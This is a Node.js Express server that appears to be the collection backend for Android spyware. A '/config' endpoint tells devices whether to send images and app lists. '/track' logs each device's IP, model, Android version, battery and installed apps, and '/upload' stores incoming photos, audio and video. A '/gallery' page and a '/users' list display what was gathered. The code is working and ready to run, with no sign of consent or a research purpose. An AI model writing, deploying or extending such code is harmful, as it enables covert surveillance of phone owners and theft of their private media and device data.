const express = require('express');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

const app = express();
app.use(express.json());

/* ================= CONFIG ================= */

const LOG_FILE = "logs.json";
const UPLOAD_DIR = path.join(__dirname, "uploads");

if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR);
}

/* ================= STORAGE ================= */

const upload = multer({
  dest: UPLOAD_DIR,
  limits: { fileSize: 50 * 1024 * 1024 }
});

app.use('/uploads', express.static(UPLOAD_DIR));

/* ================= HELPERS ================= */

function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch (e) {
    console.log("Log error:", e.message);
  }
}

function parseApps(input) {
  if (!input) return [];

  try {
    return decodeURIComponent(input)
      .split(',')
      .map(x => x.trim())
      .filter(Boolean)
      .slice(0, 200);
  } catch {
    return [];
  }
}

/* ================= 🔥 CONFIG (NEW) ================= */

app.get('/config', (req, res) => {
  // format: sendImages|sendApps
  res.send("1|1"); 
});

/* ================= TRACK ================= */

app.get('/track', (req, res) => {

  const data = {
    ip: getIP(req),
    model: req.query.model || "unknown",
    brand: req.query.brand || "unknown",
    android: req.query.android || "unknown",
    battery: Number(req.query.battery) || null,
    apps: parseApps(req.query.apps),
    time: new Date().toISOString()
  };

  console.log("\n🔥 DEVICE =====================");
  console.log(data);

  saveLog(data);

  res.json({ status: "ok" });
});

/* ================= UNIVERSAL UPLOAD ================= */

app.post('/upload', (req, res) => {

  const contentType = req.headers['content-type'] || "";

  // MULTIPART
  if (contentType.includes("multipart")) {
    return upload.single('file')(req, res, () => {

      if (!req.file) {
        return res.status(400).send("No file");
      }

      const url = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;

      console.log("\n📦 MULTIPART FILE =====================");
      console.log("File:", req.file.filename);
      console.log("Size:", req.file.size);

      saveLog({
        type: "multipart",
        file: req.file.filename,
        original: req.file.originalname,
        size: req.file.size,
        url,
        time: new Date().toISOString()
      });

      return res.json({ status: "uploaded", url });
    });
  }

  // RAW STREAM
  let ext = ".jpg";

  if (contentType.includes("png")) ext = ".png";
  else if (contentType.includes("audio")) ext = ".mp3";
  else if (contentType.includes("video")) ext = ".mp4";

  const fileName = Date.now() + ext;
  const filePath = path.join(UPLOAD_DIR, fileName);

  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);

  req.on('end', () => {

    const url = `${req.protocol}://${req.get('host')}/uploads/${fileName}`;

    console.log("\n📥 RAW FILE =====================");
    console.log("File:", fileName);
    console.log("Type:", contentType);
    console.log("IP:", getIP(req));

    saveLog({
      type: "raw",
      file: fileName,
      contentType,
      url,
      time: new Date().toISOString()
    });

    res.json({ status: "uploaded", url });
  });

  req.on('error', (err) => {
    console.log("Upload error:", err.message);
    res.status(500).send("error");
  });
});

/* ================= GALLERY ================= */

app.get('/gallery', (req, res) => {

  const files = fs.readdirSync(UPLOAD_DIR);

  let html = `
  <html>
  <head>
    <title>Gallery</title>
    <style>
      body { background:#111; color:#fff; font-family:sans-serif; }
      .grid { display:flex; flex-wrap:wrap; }
      img, video { width:200px; margin:10px; border-radius:10px; }
      a { color:#0af; display:block; margin:5px; }
    </style>
  </head>
  <body>
    <h2>Total Files: ${files.length}</h2>
    <div class="grid">
  `;

  files.reverse().forEach(file => {

    if (file.endsWith(".jpg") || file.endsWith(".png")) {
      html += `<a href="/uploads/${file}" target="_blank">
                <img src="/uploads/${file}" />
              </a>`;
    } else if (file.endsWith(".mp4")) {
      html += `<video controls src="/uploads/${file}"></video>`;
    } else if (file.endsWith(".mp3")) {
      html += `<a href="/uploads/${file}" target="_blank">🎧 ${file}</a>`;
    } else {
      html += `<a href="/uploads/${file}" target="_blank">📄 ${file}</a>`;
    }

  });

  html += `</div></body></html>`;

  res.send(html);
});

/* ================= USERS ================= */

app.get('/users', (req, res) => {
  try {
    if (!fs.existsSync(LOG_FILE)) return res.json([]);

    const list = fs.readFileSync(LOG_FILE, "utf-8")
      .split("\n")
      .filter(Boolean)
      .map(x => {
        try { return JSON.parse(x); } catch { return null; }
      })
      .filter(Boolean);

    res.json(list);

  } catch {
    res.json([]);
  }
});

/* ================= CLEAR ================= */

app.get('/clear', (req, res) => {
  fs.writeFileSync(LOG_FILE, "");
  res.send("Logs cleared");
});

/* ================= HEALTH ================= */

app.get('/health', (req, res) => {
  res.json({ status: "running" });
});

/* ================= HOME ================= */

app.get('/', (req, res) => {
  res.send("Tracker running (config + gallery + uploads)");
});

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
